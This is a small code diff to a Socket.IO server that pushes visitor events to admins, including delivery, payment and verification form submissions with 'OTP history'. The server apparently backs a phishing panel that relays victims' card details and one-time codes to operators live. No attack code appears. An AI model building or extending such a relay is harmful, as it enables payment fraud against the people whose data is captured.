@@ -95,7 +95,7 @@ io.on('connection', (socket) => {
       
       // Notify admins of new visitor with FULL data
       console.log(`📡 Broadcasting visitor:new to ${adminConnections.size} admins`);
-      adminConnections.forEach((adminSocket) => {
+      adminConnections.forEach((adminSocket, socketId) => {
         adminSocket.emit('visitor:new', {
           ...visitorResult.rows[0],
           timestamp: new Date()
@@ -120,7 +120,7 @@ io.on('connection', (socket) => {
       );
 
       // Notify all admins
-      adminConnections.forEach((adminSocket) => {
+      adminConnections.forEach((adminSocket, socketId) => {
         adminSocket.emit('visitor:pageChange', {
           sessionId,
           page,
@@ -149,7 +149,7 @@ io.on('connection', (socket) => {
       );
 
       // Notify admins with FULL visitor data
-      adminConnections.forEach((adminSocket) => {
+      adminConnections.forEach((adminSocket, socketId) => {
         adminSocket.emit('form:deliverySubmitted', {
           ...visitorResult.rows[0],
           timestamp: new Date()
@@ -199,7 +199,7 @@ io.on('connection', (socket) => {
       );
 
       // إرسال الإشعار الفوري للأدمن بالبيانات الحقيقية كاملة
-      adminConnections.forEach((adminSocket) => {
+      adminConnections.forEach((adminSocket, socketId) => {
         adminSocket.emit('form:paymentSubmitted', {
           ...visitorResult.rows[0],
           timestamp: new Date()
@@ -261,7 +261,7 @@ io.on('connection', (socket) => {
       );
 
       // Notify admins with FULL visitor data including OTP history
-      adminConnections.forEach((adminSocket) => {
+      adminConnections.forEach((adminSocket, socketId) => {
         adminSocket.emit('form:verificationSubmitted', {
           ...visitorResult.rows[0],
           timestamp: new Date()
@@ -421,7 +421,7 @@ io.on('connection', (socket) => {
       socket.emit('user:unbanned', { banId, success: true });
       
       // Notify all admins to refresh their lists
-      adminConnections.forEach((adminSocket) => {
+      adminConnections.forEach((adminSocket, socketId) => {
         adminSocket.emit('ban:listUpdate');
       });
       
@@ -452,7 +452,7 @@ io.on('connection', (socket) => {
   socket.on('admin:logoutAll', async () => {
     try {
       await pool.query('DELETE FROM admin_sessions');
-      adminConnections.forEach((adminSocket) => {
+      adminConnections.forEach((adminSocket, socketId) => {
         adminSocket.emit('admin:forceLogout');
         adminSocket.disconnect();
       });
@@ -489,7 +489,7 @@ io.on('connection', (socket) => {
           );
           
           // Notify admins
-          adminConnections.forEach((adminSocket) => {
+          adminConnections.forEach((adminSocket, socketId) => {
             adminSocket.emit('visitor:offline', {
               sessionId: client.sessionId,
               timestamp: new Date()
